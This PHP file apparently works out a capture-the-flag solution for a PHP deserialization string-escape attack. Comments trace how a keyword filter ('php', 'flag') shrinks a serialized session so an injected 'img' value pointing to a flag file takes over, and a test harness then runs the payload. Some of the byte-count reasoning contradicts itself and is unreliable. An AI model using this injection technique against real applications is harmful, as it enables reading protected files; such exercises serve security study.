<?php
// Let me trace through the filtered string more carefully
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:47:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:47:" - value 2
//   PHP reads 47 bytes from position after opening quote
//   Position after opening quote: " (closing quote of empty string)
//   
//   Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   PHP reads 47 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3 (47 bytes)
//   
//   Let me count: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3
//   
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   D = 1
//   B = 1
//   n = 1
//   M = 1
//   1 = 1
//   9 = 1
//   m = 1
//   M = 1
//   W = 1
//   F = 1
//   n = 1
//   L = 1
//   n = 1
//   B = 1
//   o = 1
//   c = 1
//   A = 1
//   = = 1
//   = = 1
//   " = 1
//   ; = 1
//   } = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   3 = 1
//   Total: 47 bytes
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: V (from "Vlc3Rf...")
//   Expected ", got V
//   Error!

// So the 47th byte is: 3 (from "Z3Vlc3Rf...")
// And the next char is: V

// We need the 47th byte to be followed by "!

// Let me find positions where " appears in the content:
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 0: "
// Position 6: "
// Position 10: "
// Position 17: "
// Position 38: "
// Position 41: "
// Position 47: "
// Position 51: "
// Position 70: "
// Position 72: "

// If we make N = 46, the (N+1)th byte (position 47) is "!
// 
// But we have 2 'php's, so the serialized length is 6 + 41 = 47.
// 
// We need N = 46, but we have N = 47!

// We need to reduce the serialized length by 1!
// 
// If we use 1 'php' + 1 'fl' (2 bytes, but 'fl' is not in the filter!), that won't work.
// 
// What if we use a shorter injection?
// 
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}" (41 bytes)
// 
// Can we make it 40 bytes?
// 
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (40 bytes, missing the last ")
// 
// But then the injection doesn't close properly!

// Let me think about this differently.
// 
// The key insight: we need the serialized length to be 46, not 47!
// 
// If we use 2 'php's (6 bytes) + injection (40 bytes) = 46 bytes.
// 
// But the injection is 41 bytes, not 40!
// 
// What if we use 1 'php' (3 bytes) + injection (41 bytes) = 44 bytes?
// 
// PHP reads 44 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"im (44 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: g (from "img")
// Expected ", got g
// Error!

// What if we use 3 'php's (9 bytes) + injection (41 bytes) = 50 bytes?
// 
// PHP reads 50 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3 (50 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: V (from "Vlc3Rf...")
// Expected ", got V
// Error!

// None of these work!

// Let me try a combination of 'php' and 'flag':
// 
// We need the serialized length to end right before a " in the remaining content.
// 
// The injection is 41 bytes.
// The remaining content after the injection is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// In the remaining content, " appears at positions 0, 6, 10, 17, 28, 30.
// 
// We want the (serialized_length - injection_length + 1)th byte of the remaining content to be "!
// 
// If serialized_length = 41 + X, then we want the (X + 1)th byte to be ".
// 
// X + 1 = 1 => X = 0. But we need shrinking!
// X + 1 = 7 => X = 6. We can use 2 'php's (6 bytes)!
// X + 1 = 11 => X = 10. We can use 2 'php's + 1 'flag' (6 + 4 = 10 bytes)!
// X + 1 = 18 => X = 17. We can use 5 'php's + 1 'flag' (15 + 4 = 19 bytes, too many)!
// X + 1 = 29 => X = 28. We can use 9 'php's + 1 'flag' (27 + 4 = 31 bytes, too many)!

// Let me try X = 6 (2 'php's):
// 
// We've already tried this and it didn't work!

// Let me try X = 10 (2 'php's + 1 'flag'):
// 
// function = 'php' * 2 + 'flag' + injection = 6 + 4 + 41 = 51 bytes
// 
// After filter: injection = 41 bytes
// 
// Serialized: s:51:"phpphpflag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:51:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 51 bytes from ""
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP reads 51 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3Rf (51 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: a (from "aW1nL...")
// Expected ", got a
// Error!

// Still doesn't work!

// Let me recalculate the positions:
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Let me find position 51:
// Position 0-40: injection (41 bytes)
// Position 41: "
// Position 42: ;
// Position 43: s
// Position 44: :
// Position 45: 3
// Position 46: :
// Position 47: "
// Position 48: i
// Position 49: m
// Position 50: g
// Position 51: "
// Position 52: ;
// Position 53: s
// ...
// 
// So position 51 is: "
// 
// If PHP reads 51 bytes (positions 0-50), the next char is position 51: "
// 
// PHP reads: " (closing quote)
// Next char: ; (position 52)
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// PHP parses this as the remaining content!

// Wait, this should work! Let me test it!

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
echo "Injection: $injection\n";
echo "Injection length: " . strlen($injection) . "\n\n";

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'phpphpflag' . $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

